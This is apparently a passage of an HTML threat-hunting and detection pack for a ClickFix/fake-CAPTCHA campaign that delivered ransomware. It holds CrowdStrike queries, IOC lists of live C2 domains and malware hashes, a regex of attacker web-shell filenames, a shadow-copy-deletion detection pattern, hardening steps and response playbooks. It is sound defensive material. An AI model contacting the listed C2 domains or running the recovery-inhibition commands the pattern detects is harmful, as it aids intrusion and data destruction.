+| TargetFileName=/(dwnen\.php|mu-uploader-installer\.php|wp-sec\.php|verify\.php|store\.php|proxy\.php|wp-uploading\.php|wp-delete\.php|wp-cssv\.php|wp-verifyup\.php|stored_url\.txt|activator\.php)$/i
+| table([@timestamp, ComputerName, UserName, TargetFileName, ContextBaseFileName, SHA256HashData], limit=200)</pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="section" id="s9">
+  <div class="section-hdr"><span class="snum">09</span><h2>CrowdStrike Custom IOA Recommendations</h2></div>
+  <div class="section-body">
+    <p>Promote the exact-match, low-FP queries to real-time Custom IOA rules. Keep the behavioral/aggregation queries as scheduled hunt searches — Q7's aggregation can't be expressed as a single-event IOA, and Q1/Q4/Q9/Q10 need an FP-tuning pass against your fleet before running unattended.</p>
+    <table>
+      <tr><th>IOA Name</th><th>Source Query</th><th>Pattern</th><th>Exclusions</th><th>Deployment Path</th></tr>
+      <tr><td>StopAndProtect — vcapcha.ps1 Reference</td><td>Q3</td><td>Process creation, <code>CommandLine</code> or <code>FileName</code> matches <code>vcapcha(\.ps1)?</code></td><td>None required</td><td>Custom IOA rule group, Severity: Critical, Action: Kill process + Notify</td></tr>
+      <tr><td>StopAndProtect — Known Stage Hash Execution</td><td>Q5</td><td>Process creation or file write, <code>SHA256HashData</code> in the 21-value list</td><td>None required</td><td>Custom IOA rule group, Severity: Critical, Action: Kill process + Network-contain + Notify</td></tr>
+      <tr><td>StopAndProtect — Base C2 DNS Resolution</td><td>Q6</td><td>DNS request, <code>DomainName</code> in the five confirmed C2 domains</td><td>None required</td><td>Custom IOA rule group, Severity: High, Action: Notify (pair with a DNS-layer block at the resolver for prevention, not just detection)</td></tr>
+      <tr><td>StopAndProtect — Shadow-Copy Deletion</td><td>Q8</td><td>Process creation, <code>CommandLine</code> matches vssadmin/wmic-shadowcopy/bcdedit/wbadmin recovery-inhibition pattern</td><td>Known backup-service accounts, once baselined</td><td>Custom IOA rule group, Severity: Critical, Action: Kill process + Notify (this is the last chance to stop encryption before it starts)</td></tr>
+      <tr><td>StopAndProtect — WordPress Web-Shell/Backdoor Write</td><td>Q11</td><td>File write, <code>TargetFileName</code> matches the named attacker PHP artifact list</td><td>None required</td><td>Custom IOA rule group (Linux sensor group on web-server hosts only), Severity: Critical, Action: Quarantine file + Notify</td></tr>
+    </table>
+    <p class="callout callout-warn">Q1 (ClickFix explorer.exe→PowerShell), Q4 (downloader chain), Q9 (SMB/USB discovery), and Q10 (WMI lateral movement) stay <strong>Investigate-only</strong> until FP-tuned against your fleet's known admin, RMM, and backup tooling. Q2 (RunMRU) and Q7 (mass file-touch aggregation) stay <strong>scheduled searches</strong> — registry-forensic recovery and cross-event aggregation are better suited to periodic hunting than real-time IOA evaluation.</p>
+  </div>
+</div>
+
+<div class="section" id="s10">
+  <div class="section-hdr"><span class="snum">10</span><h2>Machine-Readable IOC Appendix</h2></div>
+  <div class="section-body">
+    <div class="ioc-grab-grid">
+      <div class="ioc-grab">
+        <div class="igh"><span class="igt">Falcon IOC Management CSV</span><span class="igc">bulk import</span></div>
+        <button class="btn-copy" data-label="Copy CSV" onclick="copyBlock('grab-csv',this)" style="margin:0 0 6px;">Copy CSV</button>
+<pre class="code" id="grab-csv">type,value,action,severity,expiration,description,tags
+domain,v-k.com.ua,detect,high,2027-02-21,StopAndProtect compromised-WordPress base C2,campaign:StopAndProtect
+domain,www.lapellelaser.pl,detect,high,2027-02-21,StopAndProtect compromised-WordPress base C2,campaign:StopAndProtect
+domain,www.parsrulman.com,detect,high,2027-02-21,StopAndProtect compromised-WordPress base C2,campaign:StopAndProtect
+domain,mectcalcutta.com,detect,high,2027-02-21,StopAndProtect compromised-WordPress base C2,campaign:StopAndProtect
+domain,discherniation.com,detect,high,2027-02-21,StopAndProtect compromised-WordPress base C2,campaign:StopAndProtect
+sha256,cab7f141fd6f2c58055b3731ef6a64b8a2d4d88a974770b047da19c0904322f0,detect,critical,2027-02-21,PowerShell script stage 1,campaign:StopAndProtect
+sha256,cc8aa2bd7bf74ca0bbc5cb03a7b18eae73094b450d11654528c05685fe12e0c9,detect,critical,2027-02-21,PowerShell script stage 2,campaign:StopAndProtect
+sha256,99bcb531d6dd3c93d3f28f03d6e4659c865a4ffbd2fb514e809017f3446a940b,detect,critical,2027-02-21,.NET stage 1 downloader variant 1,campaign:StopAndProtect
+sha256,8337bf29100a5871b1275227006dc2a43b21b751e5ce7e2032364fd78af59ac5,detect,critical,2027-02-21,.NET stage 1 downloader variant 2,campaign:StopAndProtect
+sha256,4dee2fe98d4da75ffb259c03b50202212dafc85691429a28641a8068eddea504,detect,critical,2027-02-21,.NET stage 1 downloader variant 3,campaign:StopAndProtect
+sha256,9765b1342cc7eb982a73bb1f94c6c500b63dc817073b76ea926c1097078d3527,detect,critical,2027-02-21,.NET stage 2 downloader and loader variant 1,campaign:StopAndProtect
+sha256,7d3604d0728b242c72bd144b8661ebf63c1042a4f5dd441bc8c8507c701df20c,detect,critical,2027-02-21,.NET stage 2 downloader and loader variant 2,campaign:StopAndProtect
+sha256,976cfa57e1efacbe517b7e3441e9473d275ec1d9ad8ab69ddf8ae3a966aaa153,detect,critical,2027-02-21,.NET stage 2 downloader and loader variant 3,campaign:StopAndProtect
+sha256,b79b9b027f76579555069a7506d946648a8cb3126c0dda837dc9fee0e5c79489,detect,critical,2027-02-21,SilentEncryptor ransomware variant 1,campaign:StopAndProtect
+sha256,65550f6d0ffec8421f703cdc7273d9c0563b3d480fe6702bad294a18afe72143,detect,critical,2027-02-21,SilentEncryptor ransomware variant 2,campaign:StopAndProtect
+sha256,0080d0dd72eda4850a02e51c0e5c6f768423dfe970cafae2ab52ceee75972b40,detect,critical,2027-02-21,SilentEncryptor ransomware variant 3,campaign:StopAndProtect
+sha256,8d1e23630a6695fa9c793d73832f59436c98bba30ed81c16d01b549bd17feab4,detect,critical,2027-02-21,NetworkShareScanner SMB/USB worm variant 1,campaign:StopAndProtect
+sha256,10babb15e08f9fbd72cce11713a273b971c910dd5bdb989a3f6ff4d9c8e372c0,detect,critical,2027-02-21,NetworkShareScanner SMB/USB worm variant 2,campaign:StopAndProtect
+sha256,f042240c3de00c46dee625916bf246b7e87481e4081a6a97208b091409766e41,detect,critical,2027-02-21,NetworkShareScanner SMB/USB worm variant 3,campaign:StopAndProtect
+sha256,11a635d70444605ede1de0aa227a9fd7cfa4554e75bea93ce18b639ca571a42e,detect,high,2027-02-21,LockScreen variant 1,campaign:StopAndProtect
+sha256,2adbb2c206be7f23bf77f8f50d1ac0f809511c0b4591421931f81a6eaa42c68c,detect,high,2027-02-21,LockScreen variant 2,campaign:StopAndProtect
+sha256,38602b76f6c65644b01fa4d81708251c159a883253cda8876396dc7212324ab9,detect,high,2027-02-21,LockScreen variant 3,campaign:StopAndProtect
+sha256,23cbabfe3ca3a7f1eb365f772d6a4ed8095cb8f7755622cc82e804478259dc70,detect,critical,2027-02-21,SilentDataCollector credential/document stealer (hash corrected during provenance verification),campaign:StopAndProtect
+sha256,b3dff910b350ace27d64cbd79405cb154a1967e366d7b88170c3e8303b1d08ad,detect,high,2027-02-21,VBS spreader,campaign:StopAndProtect
+sha256,3ed8f2cc8da4853fd770ff38f0cbce6d9d4a84e75a828fc0cec3e3ec60db94f9,detect,medium,2027-02-21,SimpleChatProxy variant 1,campaign:StopAndProtect
+sha256,3ba161ca7b8dcf389ec3236c9ddfb943e9d1766181b1b81a227649cad46132a8,detect,medium,2027-02-21,SimpleChatProxy variant 2,campaign:StopAndProtect
+filename,vcapcha.ps1,hunt,high,2026-11-21,ClickFix entry script fetched via IEX/DownloadString,campaign:StopAndProtect</pre>
+      </div>
+      <div class="ioc-grab">
+        <div class="igh"><span class="igt">Machine-Readable JSON</span><span class="igc">SIEM/SOAR ingest</span></div>
+        <button class="btn-copy" data-label="Copy JSON" onclick="copyBlock('grab-json',this)" style="margin:0 0 6px;">Copy JSON</button>
+<pre class="code" id="grab-json">{
+  "campaign": "StopAndProtect",
+  "disclosed": "2026-08-18",
+  "primary_source": "https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/",
+  "c2_domains": [
+    "v-k.com.ua", "www.lapellelaser.pl", "www.parsrulman.com",
+    "mectcalcutta.com", "discherniation.com"
+  ],
+  "entry_script": "vcapcha.ps1",
+  "hashes": {
+    "powershell_stage1": ["cab7f141fd6f2c58055b3731ef6a64b8a2d4d88a974770b047da19c0904322f0"],
+    "powershell_stage2": ["cc8aa2bd7bf74ca0bbc5cb03a7b18eae73094b450d11654528c05685fe12e0c9"],
+    "dotnet_stage1_downloader": [
+      "99bcb531d6dd3c93d3f28f03d6e4659c865a4ffbd2fb514e809017f3446a940b",
+      "8337bf29100a5871b1275227006dc2a43b21b751e5ce7e2032364fd78af59ac5",
+      "4dee2fe98d4da75ffb259c03b50202212dafc85691429a28641a8068eddea504"
+    ],
+    "dotnet_stage2_loader": [
+      "9765b1342cc7eb982a73bb1f94c6c500b63dc817073b76ea926c1097078d3527",
+      "7d3604d0728b242c72bd144b8661ebf63c1042a4f5dd441bc8c8507c701df20c",
+      "976cfa57e1efacbe517b7e3441e9473d275ec1d9ad8ab69ddf8ae3a966aaa153"
+    ],
+    "silent_encryptor": [
+      "b79b9b027f76579555069a7506d946648a8cb3126c0dda837dc9fee0e5c79489",
+      "65550f6d0ffec8421f703cdc7273d9c0563b3d480fe6702bad294a18afe72143",
+      "0080d0dd72eda4850a02e51c0e5c6f768423dfe970cafae2ab52ceee75972b40"
+    ],
+    "network_share_scanner": [
+      "8d1e23630a6695fa9c793d73832f59436c98bba30ed81c16d01b549bd17feab4",
+      "10babb15e08f9fbd72cce11713a273b971c910dd5bdb989a3f6ff4d9c8e372c0",
+      "f042240c3de00c46dee625916bf246b7e87481e4081a6a97208b091409766e41"
+    ],
+    "lockscreen": [
+      "11a635d70444605ede1de0aa227a9fd7cfa4554e75bea93ce18b639ca571a42e",
+      "2adbb2c206be7f23bf77f8f50d1ac0f809511c0b4591421931f81a6eaa42c68c",
+      "38602b76f6c65644b01fa4d81708251c159a883253cda8876396dc7212324ab9"
+    ],
+    "silent_data_collector": ["23cbabfe3ca3a7f1eb365f772d6a4ed8095cb8f7755622cc82e804478259dc70"],
+    "vbs_spreader": ["b3dff910b350ace27d64cbd79405cb154a1967e366d7b88170c3e8303b1d08ad"],
+    "simple_chat_proxy": [
+      "3ed8f2cc8da4853fd770ff38f0cbce6d9d4a84e75a828fc0cec3e3ec60db94f9",
+      "3ba161ca7b8dcf389ec3236c9ddfb943e9d1766181b1b81a227649cad46132a8"
+    ]
+  },
+  "wordpress_artifacts": [
+    "dwnen.php", "mu-uploader-installer.php", "wp-content/mu-plugins/wp-sec.php",
+    "verify.php", "store.php", "proxy.php", "stored_url.txt",
+    "wp-uploading.php", "wp-delete.php", "wp-cssv.php", "wp-verifyup.php", "activator.php"
+  ]
+}</pre>
+      </div>
+      <div class="ioc-grab">
+        <div class="igh"><span class="igt">C2 Domains — Quick Copy</span><span class="igc">block/detect list</span></div>
+        <button class="btn-copy" data-label="Copy" onclick="copyBlock('grab-domains',this)" style="margin:0 0 6px;">Copy</button>
+<pre class="code" id="grab-domains">v-k.com.ua
+www.lapellelaser.pl
+www.parsrulman.com
+mectcalcutta.com
+discherniation.com</pre>
+      </div>
+      <div class="ioc-grab">
+        <div class="igh"><span class="igt">Hashes by Module — Quick Copy</span><span class="igc">grouped, plaintext</span></div>
+        <button class="btn-copy" data-label="Copy" onclick="copyBlock('grab-hashes',this)" style="margin:0 0 6px;">Copy</button>
+<pre class="code" id="grab-hashes"># PowerShell Stage 1
+cab7f141fd6f2c58055b3731ef6a64b8a2d4d88a974770b047da19c0904322f0
+
+# PowerShell Stage 2
+cc8aa2bd7bf74ca0bbc5cb03a7b18eae73094b450d11654528c05685fe12e0c9
+
+# .NET Stage 1 Downloader
+99bcb531d6dd3c93d3f28f03d6e4659c865a4ffbd2fb514e809017f3446a940b
+8337bf29100a5871b1275227006dc2a43b21b751e5ce7e2032364fd78af59ac5
+4dee2fe98d4da75ffb259c03b50202212dafc85691429a28641a8068eddea504
+
+# .NET Stage 2 Downloader & Loader
+9765b1342cc7eb982a73bb1f94c6c500b63dc817073b76ea926c1097078d3527
+7d3604d0728b242c72bd144b8661ebf63c1042a4f5dd441bc8c8507c701df20c
+976cfa57e1efacbe517b7e3441e9473d275ec1d9ad8ab69ddf8ae3a966aaa153
+
+# SilentEncryptor (ransomware)
+b79b9b027f76579555069a7506d946648a8cb3126c0dda837dc9fee0e5c79489
+65550f6d0ffec8421f703cdc7273d9c0563b3d480fe6702bad294a18afe72143
+0080d0dd72eda4850a02e51c0e5c6f768423dfe970cafae2ab52ceee75972b40
+
+# NetworkShareScanner (SMB/USB worm)
+8d1e23630a6695fa9c793d73832f59436c98bba30ed81c16d01b549bd17feab4
+10babb15e08f9fbd72cce11713a273b971c910dd5bdb989a3f6ff4d9c8e372c0
+f042240c3de00c46dee625916bf246b7e87481e4081a6a97208b091409766e41
+
+# LockScreen
+11a635d70444605ede1de0aa227a9fd7cfa4554e75bea93ce18b639ca571a42e
+2adbb2c206be7f23bf77f8f50d1ac0f809511c0b4591421931f81a6eaa42c68c
+38602b76f6c65644b01fa4d81708251c159a883253cda8876396dc7212324ab9
+
+# SilentDataCollector (credential/document stealer)
+23cbabfe3ca3a7f1eb365f772d6a4ed8095cb8f7755622cc82e804478259dc70
+
+# VBS Spreader
+b3dff910b350ace27d64cbd79405cb154a1967e366d7b88170c3e8303b1d08ad
+
+# SimpleChatProxy
+3ed8f2cc8da4853fd770ff38f0cbce6d9d4a84e75a828fc0cec3e3ec60db94f9
+3ba161ca7b8dcf389ec3236c9ddfb943e9d1766181b1b81a227649cad46132a8</pre>
+      </div>
+      <div class="ioc-grab">
+        <div class="igh"><span class="igt">WordPress Attacker Artifacts</span><span class="igc">server-side reference</span></div>
+        <button class="btn-copy" data-label="Copy" onclick="copyBlock('grab-wp',this)" style="margin:0 0 6px;">Copy</button>
+<pre class="code" id="grab-wp"># Attacker-side endpoints observed on compromised WordPress base-C2 hosts
+dwnen.php                          -- file-listing/download endpoint
+mu-uploader-installer.php          -- installs the hidden MU-plugin uploader
+wp-content/mu-plugins/wp-sec.php   -- hidden must-use plugin (loads automatically)
+  REST endpoint: wp-json/wp-sec/v1/upload
+verify.php                         -- fake-CAPTCHA plugin; drops store.php/proxy.php/stored_url.txt
+store.php                          -- edits stored_url.txt
+proxy.php                          -- fetches remote log file
+stored_url.txt                     -- marker file: fake-CAPTCHA base URL, or "off" when disabled
+wp-uploading.php                   -- secure upload (overwrite + auto-create folder)
+wp-delete.php                      -- secure file deletion
+wp-cssv.php                        -- single-file PHP web shell (Secure File Manager)
+wp-verifyup.php                    -- file explorer with remote fetch + multi-server fallback
+activator.php                      -- plugin-activation helper, self-deletes after use
+
+# Leaked attacker developer-machine path artifacts (context/attribution only, not endpoint-hunt-able)
+C:\Users\marks\source\
+project dirs: 0a_botnet, fake-captcha
+prefix string: G-a_new_hack-0a_botnet-fake-capcha-a-master-4-a-updater-plugin-send-new-plugin</pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="section" id="s11">
+  <div class="section-hdr"><span class="snum">11</span><h2>Detection Validation Gates</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>Gate</th><th>Requirement</th><th>Status / Notes</th></tr>
+      <tr><td>Telemetry ready</td><td><code>ProcessRollup2</code>/<code>SyntheticProcessRollup2</code>, <code>NetworkConnectIP4</code>, <code>DnsRequest</code>, <code>RegGenericValueUpdate</code>/<code>AsepValueUpdate</code>, <code>RansomwareOpenFile</code>, <code>NewExecutableWritten</code>/<code>PeFileWritten</code> flowing from endpoints with a Falcon sensor</td><td>Confirm sensor coverage before relying on Q1–Q10; Q11 additionally requires a Linux sensor on any self-hosted WordPress infrastructure (Section 5 gap)</td></tr>
+      <tr><td>Benign baseline</td><td>Run Q1, Q4, Q7, Q9, and Q10 against 7–30 days of history before promoting any to an alerting IOA — all five carry medium FP by design</td><td>Not yet run in a live tenant; field names validated against the reference data model, not fired live — validate on first deployment</td></tr>
+      <tr><td>Positive test</td><td>Confirm each query returns the expected shape against a synthetic/lab event before trusting a zero-hit result as "clean"</td><td>Recommended: replay the published ClickFix command pattern (Section 3) against an isolated lab VM to generate a known-positive event for Q1–Q3</td></tr>
+      <tr><td>Promotion criteria</td><td>Only Q3, Q5, Q6, Q8, and Q11 are promoted to Custom IOA (Section 9) — exact-match indicators, single-event pattern, low FP</td><td>Q1, Q4, Q9, Q10 remain scheduled hunt searches pending fleet-specific tuning; Q2 and Q7 remain scheduled searches by design (forensic recovery / aggregation)</td></tr>
+    </table>
+  </div>
+</div>
+
+<div class="section" id="s12">
+  <div class="section-hdr"><span class="snum">12</span><h2>Hardening — Tiered</h2></div>
+  <div class="section-body">
+    <p>This is a social-engineering attack with a multi-payload back end — there is no single patch. Hardening here targets the delivery mechanism (Run-dialog paste execution), the WordPress compromise vector for any organization-hosted sites, and the downstream ransomware/exfiltration impact.</p>
+
+    <div class="tier-blk tier-imm">
+      <div class="tier-lbl">Immediate — this week</div>
+      <p><strong>Disable the Windows Run dialog and Win+R shortcut via GPO for standard users.</strong> Set <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer</code> DWORD values <code>NoRun=1</code> and <code>NoWinKeys=1</code> for non-administrative user groups. This is the single highest-leverage control against ClickFix specifically, since the lure depends entirely on the victim reaching the Run dialog. <em>Authority: documented community/industry ClickFix mitigation guidance (ClickFix Wiki mitigations page; Medium — "Mitigating ClickFix Attacks with Group Policy Enforcement").</em> <strong>Verify:</strong> <code>Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer'</code> shows <code>NoRun=1</code> on a managed endpoint; Win+R is confirmed non-functional for a standard-user test account.</p>
+      <p><strong>Enable the two directly-relevant Microsoft Defender Attack Surface Reduction rules in Block mode.</strong> "Block execution of potentially obfuscated scripts" (GUID <code>5beb7efe-fd9a-4556-801d-275e5ffc04cc</code>) and "Block process creations originating from PSExec and WMI commands" (GUID <code>d1e49aac-8f56-4280-b9ba-993a6d77406c</code>, covers the VBS spreader's WMI lateral-movement path). <em>Authority: Microsoft Learn — Attack surface reduction rules reference.</em> <strong>Verify:</strong> <code>Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids</code> lists both GUIDs with action <code>1</code> (Block).</p>
+      <p><strong>Block the five confirmed C2 domains at DNS/proxy.</strong> Add <code>v-k.com.ua</code>, <code>www.lapellelaser.pl</code>, <code>www.parsrulman.com</code>, <code>mectcalcutta.com</code>, <code>discherniation.com</code> to your DNS sinkhole/secure-web-gateway blocklist. <em>Mapped to M1037 (Filter Network Traffic).</em> <strong>Verify:</strong> a test resolution attempt against any of the five domains from a managed endpoint fails or resolves to the sinkhole address.</p>
+      <p><strong>If your organization self-hosts WordPress: patch immediately and run the Section 7 artifact sweep.</strong> Update WordPress core and all plugins to current versions, and run the mu-plugins/web-shell filename sweep from Section 7 on every self-hosted site regardless of whether compromise is suspected. <em>Authority: CIS Controls v8, Control 7 (Continuous Vulnerability Management); WordPress.org Hardening WordPress documentation.</em> <strong>Verify:</strong> <code>wp plugin list --update=available</code> returns zero pending updates; the Section 7 sweep returns zero hits.</p>
+    </div>
+
+    <div class="tier-blk tier-near">
+      <div class="tier-lbl">Near term — 1–4 weeks</div>
+      <p><strong>PowerShell logging and language-mode hardening.</strong> Enable Script Block Logging (event 4104), Module Logging, and where feasible Constrained Language Mode for standard users, plus AMSI integration — this raises the cost of the PowerShell Stage 1/2 chain even if the Run-dialog control is somehow bypassed. <em>Mapped to M1038, M1042, M1047; CIS Microsoft Windows Benchmark — PowerShell logging &amp; language-mode sections; Microsoft Security Baseline (SCT) — PowerShell policies.</em> <strong>Verify:</strong> <code>$ExecutionContext.SessionState.LanguageMode</code> returns <code>ConstrainedLanguage</code> on a managed standard-user session; Script Block Logging events (4104) are present in the Windows Event Log.</p>
+      <p><strong>User-awareness training specific to ClickFix / fake-CAPTCHA lures.</strong> Brief staff that no legitimate CAPTCHA or verification page ever asks them to open Win+R or a terminal and paste a command — this is a durable behavioral signal regardless of which site or payload the attacker uses next. <em>⚠ best-practice, no formal CIS/NIST line item specific to ClickFix training content; general awareness-training obligation is covered by CIS Controls v8, Control 14.</em> <strong>Verify:</strong> phishing/social-engineering simulation program includes a ClickFix-style scenario with a measured click/paste rate.</p>
+      <p><strong>File-integrity monitoring on WordPress mu-plugins and wp-content directories (self-hosted only).</strong> Monitor <code>wp-content/mu-plugins/</code> and the plugin root for unexpected file creation — MU plugins load automatically with no admin-panel activation step, making them a favored persistence location. <em>Authority: WordPress.org Hardening WordPress documentation; CIS Controls v8, Control 3 (Data Protection).</em> <strong>Verify:</strong> a test file dropped into <code>wp-content/mu-plugins/</code> outside the deployment pipeline triggers an alert within one scan interval.</p>
+      <p><strong>Backup immutability and offline/air-gapped copies.</strong> Ensure backup infrastructure cannot be reached or deleted from a compromised endpoint (immutable/WORM storage or offline copies), directly countering the shadow-copy-deletion/recovery-inhibition behavior this pack hunts for in Q8. <em>Mapped to M1053 (Data Backup); NIST SP 800-53 CP-9.</em> <strong>Verify:</strong> a test deletion/modification attempt against the backup repository from a standard endpoint account fails.</p>
+    </div>
+
+    <div class="tier-blk tier-strat">
+      <div class="tier-lbl">Strategic — 1–3 months</div>
+      <p><strong>Web-content filtering / browser isolation for high-risk categories.</strong> Deploy remote browser isolation or category-based content filtering that flags newly-registered or recently-compromised sites before the fake-CAPTCHA page ever renders, closing the browser-DOM gap documented in Section 5. <em>⚠ best-practice, no formal CIS benchmark line item for browser isolation specifically; aligns with CIS Controls v8, Control 9 (Email and Web Browser Protections).</em> <strong>Verify:</strong> a test navigation to a known-malicious category site is blocked or isolated before page render.</p>
+      <p><strong>Standardize on a managed/hosted WordPress platform with vendor-applied patching, or adopt automated core/plugin update policies, for any organization-run WordPress properties.</strong> The root cause across the ~2,000 compromised sites Check Point analyzed is outdated WordPress software — removing the maintenance burden from individual site owners removes the entry vector at scale. <em>Authority: CIS Controls v8, Control 7; WordPress.org Hardening WordPress documentation.</em> <strong>Verify:</strong> all organization-owned WordPress instances report auto-update enabled or are confirmed on a managed platform with a documented patch SLA.</p>
+      <p><strong>Network segmentation to blunt SMB/USB worm and WMI lateral-movement spread.</strong> Restrict SMB (445) and WMI (135/RPC dynamic range) between workstation VLANs by default, limiting how far NetworkShareScanner and the VBS spreader can travel from a single ClickFix-infected host. <em>Mapped to M1030 (Network Segmentation); CIS Controls v8, Control 12 (Network Infrastructure Management).</em> <strong>Verify:</strong> a test SMB/WMI connection attempt between two workstation-VLAN hosts (neither a file server nor a management host) is blocked at the firewall/switch ACL.</p>
+    </div>
+  </div>
+</div>
+
+<div class="section" id="s13">
+  <div class="section-hdr"><span class="snum">13</span><h2>Deployable Playbooks</h2></div>
+  <div class="section-body">
+
+    <h3>Playbook 1 — Disable Win+R / Run dialog and enable the two ASR rules (Windows, GPO)</h3>
+    <pre class="code">Prerequisites: Domain Admin or GPO-edit rights; a test OU to pilot the policy before fleet-wide rollout; Microsoft Defender for Endpoint / Defender AV in active mode for the ASR rules.
+Reboot required: No (policy refresh via `gpupdate /force` and a logoff/logon is sufficient).
+Rollback: Set NoRun and NoWinKeys back to 0 (or remove the GPO link) and set the two ASR rule GUIDs to Audit or Not Configured; changes apply on the next policy refresh with no other endpoint state affected.
+
+1. Create or edit a GPO scoped to standard-user OUs (exclude IT/helpdesk/admin OUs where Run-dialog use is legitimate).
+2. Under Computer Configuration &gt; Preferences &gt; Windows Settings &gt; Registry, add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun = 1 (DWORD) and NoWinKeys = 1 (DWORD).
+3. Under Microsoft Defender / Endpoint Security policy, set Attack Surface Reduction rules 5beb7efe-fd9a-4556-801d-275e5ffc04cc and d1e49aac-8f56-4280-b9ba-993a6d77406c to Block. Start in Audit mode for one week on the pilot OU if you have not previously baselined these rules.
+4. Link the GPO to the pilot OU; run `gpupdate /force` on a test machine and confirm via `Get-ItemProperty` and `Get-MpPreference`.
+5. Confirm Win+R no longer opens the Run dialog for a standard-user test account, and that admin/helpdesk OUs are unaffected.
+6. Expand the GPO link to the full standard-user OU structure after a successful pilot week with no help-desk ticket spike.</pre>
+
+    <h3>Playbook 2 — DNS/proxy block on the five confirmed C2 domains (network)</h3>
+    <pre class="code">Prerequisites: admin access to the organization's DNS sinkhole, secure web gateway, or firewall DNS-filtering policy.
+Reboot required: No.
+Rollback: Remove the five blocklist entries; no endpoint state is changed by this control.
+
+1. Add v-k.com.ua, www.lapellelaser.pl, www.parsrulman.com, mectcalcutta.com, discherniation.com to the DNS sinkhole/SWG blocklist.
+2. If your gateway supports category/reputation feeds, also flag the domains for the threat-intel feed update cycle so future infrastructure sharing the same hosting pattern is caught faster.
+3. Validate: attempt DNS resolution of each domain from a managed test endpoint; confirm it fails closed or resolves to the sinkhole address.
+4. Confirm no legitimate business traffic depends on any of the five domains (expected: none — they are compromised third-party WordPress sites) before considering the block permanent.</pre>
+
+    <h3>Playbook 3 — WordPress artifact sweep and remediation (self-hosted WordPress only)</h3>
+    <pre class="code">Prerequisites: SSH or WP-CLI access to the WordPress host; a recent, verified-clean backup to restore from if compromise is confirmed.
+Reboot required: No (web-server process reload only, if PHP-FPM/Apache/Nginx config changes).
+Rollback: N/A for the sweep itself (read-only); if remediation actions are taken (file deletion, plugin removal), rollback is restoring the pre-remediation backup.
+
+1. Run the Section 7 `find` command against the WordPress install root for the twelve named attacker filenames.
+2. Run `ls -la wp-content/mu-plugins/` and manually review every file present — MU plugins have no admin-panel toggle, so an unrecognized file here is a strong compromise signal by itself.
+3. If any artifact is found: take the site offline or place it in maintenance mode, preserve the artifact files and web-server access logs as evidence, then remove the artifacts and any unrecognized plugin/theme files.
+4. Update WordPress core and all plugins to current versions (`wp core update`, `wp plugin update --all`).
+5. Rotate all WordPress admin credentials and any API keys/tokens stored in the compromised install.
+6. Restore from the last known-clean backup if the extent of the compromise (e.g. database-level tampering) cannot be fully characterized by file-level remediation alone.
+7. Re-run the Section 7 sweep post-remediation; zero hits is the exit criterion.</pre>
+  </div>
+</div>
+
+<div class="section" id="s14">
+  <div class="section-hdr"><span class="snum">14</span><h2>Containment Runbook</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>Phase</th><th>Actions</th><th>Owner</th><th>Evidence to Preserve</th></tr>
+      <tr><td>Isolate</td><td>Network-contain any host with a positive hit on Q1, Q3, Q4, Q5, Q6, Q7, or Q8. Treat the host as compromised, not just as having visited a bad site — by the time any of these queries fire, code has already executed with the logged-in user's privileges.</td><td>IR / SOC on-call</td><td>Falcon process tree, network-connection events, and RunMRU/registry snapshot for the affected time range; memory/disk image if policy requires</td></tr>
+      <tr><td>Eradicate</td><td>Kill any process matching Q1/Q3/Q5; remove any dropped payload matching the Section 4/10 hash list; if ransomware detonation is confirmed (Q7/Q8 positive), do not attempt in-place decryption — isolate and proceed to recovery from backup. For any organization-hosted WordPress site with a Q11 hit, run Playbook 3 in full.</td><td>IR / Endpoint Engineering</td><td>Before/after listing of dropped artifacts; hashes of any recovered payload binaries; copy of the RunMRU value for the confirmed pasted command</td></tr>
+      <tr><td>Recover</td><td>Rotate every credential reachable from the affected host: local/domain credentials, saved browser logins, any credentials SilentDataCollector may have had file-system access to. Restore encrypted files from backup — do not pay the ransom or rely on the actor-provided decryption path. Restore the host from a known-clean image where feasible given the multi-module payload set (worm module may have already spread).</td><td>IR + Identity owners</td><td>Credential-rotation log; list of hosts scanned for lateral-spread indicators (Q9/Q10) before being cleared</td></tr>
+      <tr><td>Post-incident</td><td>Confirm all validation gates (Section 11) are green on the remediated fleet. Deploy the Near-term and Strategic hardening tiers (Section 12), specifically the Run-dialog GPO and ASR rules if not already fleet-wide. File the incident against the specific hosts and, if applicable, the organization-hosted WordPress properties identified in remediation.</td><td>Security Engineering</td><td>Closure report referencing this pack's version (v0.1, 2026-08-21) and the specific hosts/sites remediated</td></tr>
+    </table>
+  </div>
+</div>
+
+<div class="section" id="s15">
+  <div class="section-hdr"><span class="snum">15</span><h2>Detection Coverage Map</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>Technique</th><th>Behavior</th><th>CQL</th><th>IOA</th><th>Coverage</th></tr>
+      <tr><td>T1204.004</td><td>ClickFix — Run-dialog paste, explorer.exe parenting hidden/bypassed PowerShell</td><td>Q1, Q2, Q3</td><td>vcapcha.ps1 Reference IOA (Q3)</td><td><span class="badge b-low">Good</span></td></tr>
+      <tr><td>T1105 / T1027</td><td>PowerShell-to-.NET downloader/loader chain detonation</td><td>Q4, Q5</td><td>Known Stage Hash IOA (Q5)</td><td><span class="badge b-low">Good</span></td></tr>
+      <tr><td>T1071.001 / T1102</td><td>Base-C2 beaconing over compromised WordPress infrastructure</td><td>Q6</td><td>Base C2 DNS Resolution IOA (Q6)</td><td><span class="badge b-med">Partial — DNS-layer only, no resolved IPs published</span></td></tr>
+      <tr><td>T1486</td><td>SilentEncryptor mass file encryption/rename</td><td>Q5 (hash), Q7 (volume spike)</td><td>Known Stage Hash IOA (Q5)</td><td><span class="badge b-low">Good</span></td></tr>
+      <tr><td>T1490</td><td>Shadow-copy deletion / recovery inhibition</td><td>Q8</td><td>Shadow-Copy Deletion IOA (Q8)</td><td><span class="badge b-med">Partial — generic ransomware pattern, not independently confirmed for SilentEncryptor</span></td></tr>
